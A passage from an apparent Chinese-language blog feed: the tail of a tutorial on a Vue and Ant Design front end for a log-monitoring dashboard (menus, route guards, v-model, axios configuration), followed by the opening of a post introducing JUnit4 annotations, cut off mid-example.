class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;dashboard&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>立体数据<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;attackaddress&quot;</span>&gt;</span></span><br><span class="line">              攻击溯源</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;watchlog&quot;</span>&gt;</span></span><br><span class="line">            实时监控</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;9&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;setting&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;setting&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span>&gt;</span>系统设置<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;10&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showModal&quot;</span>&gt;</span>        </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> &gt;</span>登出<span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br><span class="line">          <span class="tag">&lt;<span class="name">a-modal</span> <span class="attr">v-model</span>=<span class="string">&quot;visible&quot;</span> <span class="attr">title</span>=<span class="string">&quot;Basic Modal&quot;</span> @<span class="attr">ok</span>=<span class="string">&quot;handleOk&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>是否确定登出？<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-modal</span>&gt;</span>        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-menu</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout-sider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-header</span> <span class="attr">theme</span>=<span class="string">dark</span> &gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-header</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 上面是在导航栏最顶端加东西 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-content</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0 16px&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-content</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-layout-footer</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">        Ant Design ©2018 Created by Ant UED</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-layout-footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a-layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要注意的是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在Vue当中，这个相当于一个插槽，也就是，呃，类似一个include函数，我们如果想要把他当作模板的话就需要这样写，比如我们的report.vue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> menus <span class="keyword">from</span> <span class="string">&#x27;../commons/menu&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;menu&gt;&lt;/menu&gt;</span><br><span class="line"><span class="comment">//在下面导入，之后再html当中使用即可</span></span><br><span class="line">components:&#123;</span><br><span class="line">        menus,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="6-路由守卫"><a href="#6-路由守卫" class="headerlink" title="6.路由守卫"></a>6.路由守卫</h2><p>我们前端肯定是要鉴权的吧，不然用户就可对前端为所欲为了，故我们构造一个局部守卫是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeRouteEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span> &#123;</span><br><span class="line">            axios.post(<span class="string">&#x27;/report&#x27;</span>).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (res.data == <span class="number">0</span>) next(&#123; <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span> &#125;);</span><br><span class="line">              <span class="keyword">else</span> next();</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br></pre></td></tr></table></figure>

<p>这样的话，再访问该路由，离开路由的时候都会先访问一次页面，我们后端写好代码，如果用户没有登陆的话，就会返回到index页面了。</p>
<h2 id="7-期待值"><a href="#7-期待值" class="headerlink" title="7.期待值"></a>7.期待值</h2><p>这个理解起来单靠嘴说较为僵硬，需要实战中使用才可以领悟的清楚，比如我们的html代码中构造如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;margin:&#x27;-20px 0px 0px 200px&#x27;&#125;&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;ExportSavePdf(htmlTitle,nowTime)&quot;</span>&gt;</span>报告生成<span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（通过Vue框架，我们可以使用@click的方法来处理各种事件，之后填入一个函数，并写入函数的实参，而实参不一定是一定出现的，所以我们的实参可能会出现为null的情况，而Vue不想出现这种情况，所以要求我们填入默认值，也就是期待值，当我们没有填入参数的时候自动填入的参数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      data,</span><br><span class="line">      columns,</span><br><span class="line">      htmlTitle: <span class="string">&#x27;report&#x27;</span>,</span><br><span class="line">      keyName: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="8-设置默认值"><a href="#8-设置默认值" class="headerlink" title="8.设置默认值"></a>8.设置默认值</h2><p>有的时候，我们可能想在用户访问之前的时候直接获取数据，这样的话就可以直接拿到数据了，于是我们可以通过如下方法：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">    <span class="comment">// this.drawChart();</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>以这种方式填入的值，当用户访问页面的时候便会自动进行调用。例子：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&#x27;/setting&#x27;</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.usersData(res.data);</span><br><span class="line">      <span class="comment">// location.reload()</span></span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">err</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(err)</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="9-实现监听数据"><a href="#9-实现监听数据" class="headerlink" title="9.实现监听数据"></a>9.实现监听数据</h2><p>在之前的layui的时候，因为我不会对数据进行绑定，所以往往造成自己要写很多的type=hiden，或者必须构造form表单的情况，而使用框架之后可以通过v-model操作简单的实现这个效果，</p>
<p>例如我们可以构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a-form-model-item style=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span><br><span class="line">                            &lt;a-input  type=<span class="string">&quot;password&quot;</span> placeholder=<span class="string">&quot;logKey&quot;</span> v-model=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span><br><span class="line">                                &lt;a-icon slot=<span class="string">&quot;prefix&quot;</span> type=<span class="string">&quot;lock&quot;</span> style=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span><br><span class="line">                            &lt;/a-input&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    &lt;a-form-model-item <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span><br><span class="line">                      &lt;a-button</span><br><span class="line">                            type=<span class="string">&quot;primary&quot;</span></span><br><span class="line">                            html-type=<span class="string">&quot;submit&quot;</span></span><br><span class="line">                            @click=<span class="string">&quot;selectAddress($event)&quot;</span></span><br><span class="line">                        &gt;</span><br><span class="line">                            添加</span><br><span class="line">                        &lt;/a-button&gt;</span><br><span class="line">                    &lt;/a-form-model-item&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在JS代码中：</span></span><br><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现，我并没有写form表单，而我依然可以实现提交数据，是因为使用v-model监听之后，该input输入框的内容被JS实时监控着。</p>
<h2 id="10-监听的妙用"><a href="#10-监听的妙用" class="headerlink" title="10.监听的妙用"></a>10.监听的妙用</h2><p>利用监听，我们可以很轻松的完成对一些看起来很酷炫的特效，比如，如果用户想要提交点击一个按钮，就需要填写几个input框，并且如果框是空的，还可以给出提示等等，这里举出一个例子，比如：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户名判断 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-form-item</span> <span class="attr">:validate-status</span>=<span class="string">&quot;userNameError() ? &#x27;error&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">:help</span>=<span class="string">&quot;userNameError() || &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-input</span></span></span><br><span class="line"><span class="tag">        <span class="attr">v-decorator</span>=<span class="string">&quot;[</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#x27;userName&#x27;,</span></span></span><br><span class="line"><span class="tag"><span class="string">          &#123; rules: [&#123; required: true, message: &#x27;Please input your username!&#x27; &#125;] &#125;,</span></span></span><br><span class="line"><span class="tag"><span class="string">        ]&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">      &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;user&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a-form-item</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>顺便一提， 用:引号写入的东西，一般我们是用于条件判断，比如在这里，我们就是利用这个去判断userNameError的状况</p>
<p>在methods当中，我们构造如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">userNameError</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">     <span class="keyword">const</span> &#123; getFieldError, isFieldTouched &#125; = <span class="built_in">this</span>.form;</span><br><span class="line">     <span class="keyword">return</span> isFieldTouched(<span class="string">&#x27;userName&#x27;</span>) &amp;&amp; getFieldError(<span class="string">&#x27;userName&#x27;</span>);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure>

<p>在data当中：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      hasErrors,</span><br><span class="line">      form: <span class="built_in">this</span>.$form.createForm(<span class="built_in">this</span>, &#123; <span class="attr">name</span>: <span class="string">&#x27;getWebsocket&#x27;</span> &#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>官方是如下解释的：</p>
<p>v-decorator 是 Ant Design 的控件验证属性。</p>
<p>经过 <code>getFieldDecorator</code> 或 <code>v-decorator</code> 包装的控件，表单控件会自动添加 <code>value</code>（或 <code>valuePropName</code> 指定的其他属性） <code>onChange</code>（或 <code>trigger</code> 指定的其他属性），数据同步将被 Form 接管，这会导致以下结果：</p>
<p>你不再需要也不应该用 <code>onChange</code> 来做同步，但还是可以继续监听 <code>onChange</code> 等事件。</p>
<p>你不能用控件的 <code>value defaultValue</code> 等属性来设置表单域的值，默认值可以用 <code>getFieldDecorator</code> 或 <code>v-decorator</code> 里的 initialValue。</p>
<p>你不应该用 <code>v-model</code>，可以使用 <code>this.form.setFieldsValue</code> 来动态改变表单值。</p>
<p>也就是说这种方式是吧form由Vue彻底托管了~和之前的不同，会自动判断是否存在值，如果不存在的话，将会调用v-decorator。当然这种方式我是比较模糊的，真要说我比较理解的是另外一个形式</p>
<h2 id="11-v-model的妙用"><a href="#11-v-model的妙用" class="headerlink" title="11.v-model的妙用"></a>11.v-model的妙用</h2><p>在html当中写下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0px 10px 0px 00px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;selectAddress&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a-input</span>  <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;logKey&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;attackAddressName&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">slot</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">type</span>=<span class="string">&quot;lock&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:rgba(0,0,0,.25)&quot;</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a-input</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line">                        </span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">a-form-model-item</span> <span class="attr">class</span>=<span class="string">&quot;selectButton&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">a-button</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">html-type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                            @<span class="attr">click</span>=<span class="string">&quot;selectAddress($event)&quot;</span></span></span><br><span class="line"><span class="tag">                        &gt;</span></span><br><span class="line">                            添加</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">a-button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a-form-model-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a-alert</span> <span class="attr">message</span>=<span class="string">&quot;输入key，即可自动溯源&quot;</span> <span class="attr">type</span>=<span class="string">&quot;info&quot;</span> <span class="attr">class</span>=<span class="string">&quot;fontKey&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">a-spin</span> <span class="attr">size</span>=<span class="string">&quot;large&quot;</span> <span class="attr">class</span>=<span class="string">&quot;spinner&quot;</span> <span class="attr">:spinning</span>=<span class="string">&quot;spinning&quot;</span> <span class="attr">:delay</span>=<span class="string">&quot;delayTime&quot;</span> /&gt;</span></span><br><span class="line">                  </span><br></pre></td></tr></table></figure>

<p>注意这里的spinning，我们给她进行托管，如果可以的话，而spinning的期望默认值在data当中构造：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    return&#123;</span><br><span class="line">    attackAddressName:&#x27;&#x27;,</span><br><span class="line">    spinning: false,</span><br><span class="line">    delayTime: 500,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>而当我们点击按钮发送数据之后：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">selectAddress:<span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">      <span class="comment">// console.log(this.attackAddressName)</span></span><br><span class="line">      <span class="keyword">let</span> formAddress = <span class="keyword">new</span> FormData();</span><br><span class="line">      formAddress.append(<span class="string">&#x27;logname&#x27;</span>, <span class="built_in">this</span>.attackAddressName)</span><br><span class="line">      <span class="comment">// console.log(formAddress.get(&#x27;logname&#x27;))</span></span><br><span class="line">      <span class="built_in">this</span>.spinning = <span class="literal">true</span>;</span><br><span class="line">      axios.post(<span class="string">&#x27;/setting&#x27;</span>,formAddress).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> earchData =<span class="built_in">JSON</span>.parse(res.data)</span><br><span class="line">        <span class="comment">// console.log(res.data)</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">this</span>.china(earchData);</span><br><span class="line">        <span class="built_in">this</span>.spinning = <span class="literal">false</span>;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>一旦数据成功发送过去，我们就将spinning的值改成true，这样就可以显示了，当获取数据之后，我们就改成false，让他消失即可</p>
<h1 id="axios-part"><a href="#axios-part" class="headerlink" title="axios part"></a>axios part</h1><h2 id="1-aiox发送数据"><a href="#1-aiox发送数据" class="headerlink" title="1.aiox发送数据"></a>1.aiox发送数据</h2><p>axios是一个组件，用于发送数据给后端，相当好用，我们为了降低代码耦合性，应该抓门建立一个axios文件夹，并且设置一个http.js，各种各样的设置我们都在axios当中进行配置即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">import axios from &#x27;axios&#x27;</span><br><span class="line"></span><br><span class="line">axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;</span><br><span class="line">axios.defaults.timeout = 1000000;</span><br><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure>



<p>例如这样，就是设置了默认的url，设置超时事件，带上cookies等等，而axios的使用也很简单，构造如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.post(<span class="string">&quot;/login&quot;</span>,formData,config).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">res.data == <span class="number">0</span> </span>)</span>&#123;</span><br><span class="line">         alert(<span class="string">&quot;账号或密码错误！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="built_in">this</span>.$message.success(<span class="string">` login successfully!`</span>);</span><br><span class="line">          router.push(&#123; <span class="attr">path</span>:<span class="string">&quot;/upload&quot;</span> &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>axios.get/post</p>
<p>axios.get().theml().catch()</p>
<p>在then和cat当中去写别的东西，上图当中的res.data为API给回来的数据，成功之后router.push就可以让页面进行跳转了</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>感觉自己是边学边写的，学到后面的时候感觉之前的东西还可以做得更好，但是蓝狗了，已经不想动了orz</p>
]]></content>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>fastJson</title>
    <url>/2020/11/02/fastJson/</url>
    <content><![CDATA[<h1 id="JUnit4"><a href="#JUnit4" class="headerlink" title="JUnit4"></a>JUnit4</h1><p>在学习fastjson之前，感觉有必要先学习一下Junit4的注解，自从SpringBoot之后注解大量的被使用，</p>
<p>JUnit出现的与因为main方法测试很不方便，摘自百度的部分：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">用main方法测试的话就很不方便，想测试全部方法的话就得把测试代码全部写到里，或者你测一个重写一次。且更重要的是，这样会使测试代码与运行逻辑代码混在一起，不规范。</span><br><span class="line">使用junit就方便多了,这是单元测试，你想测哪个方法就写一个对应的测试方法，然后用junit运行。每个方法之间是独立的，非常灵活。而且测试方法一般不会直接写在原类中，而是单独的测试类，这样测试代码就完全与逻辑代码分开了。	</span><br></pre></td></tr></table></figure>

<p>而在Junit4大量使用了从Java5中开始使用的注解，如下是JUnit4常用的注解：</p>
<h2 id="before，test，after"><a href="#before，test，after" class="headerlink" title="before，test，after"></a>before，test，after</h2><ul>
<li><p>Before：初始化方法，针对每个测试方法，都会执行一遍</p>
</li>
<li><p>Test: 代替main函数，可以让我们灵活的测试某部分代码,注意，测试的时候<strong>不要写一个Test类！！！！</strong>，否则因为会有限选择同包下的test类，导致报错,@Test方法所在类中,<strong>不能存在有参数构造函数,无参构造可以存在</strong></p>
</li>
<li><p>After：在方法结束之后执行，每次都会执行！</p>
</li>
</ul>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;最先被执行！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;wdnmd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我之后才会被执行呢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除此之外，Test注解还允许我们添加参数，检测是否抛出某部分异常：</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当代码出现异常的时候，则不会抛出异常，相反的，如果这段代码正常抛出，就会抛出异常了。</p>
<h2 id="beforeclass，afterclass"><a href="#beforeclass，afterclass" class="headerlink" title="beforeclass，afterclass"></a>beforeclass，afterclass</h2><ul>
<li>BeforeClass: 在所有类被执行之前执行，只会执行一次，同时必须为static静态方法（因为他们就相当于此）</li>
<li>AfterClass: 在所有类被执行之后执行</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我就相当于构造器！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是test1，我被执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我之后才会被执行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test(expected = Exception.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            array[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;我是test2执行了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@BeforeClass</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">beforeClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span 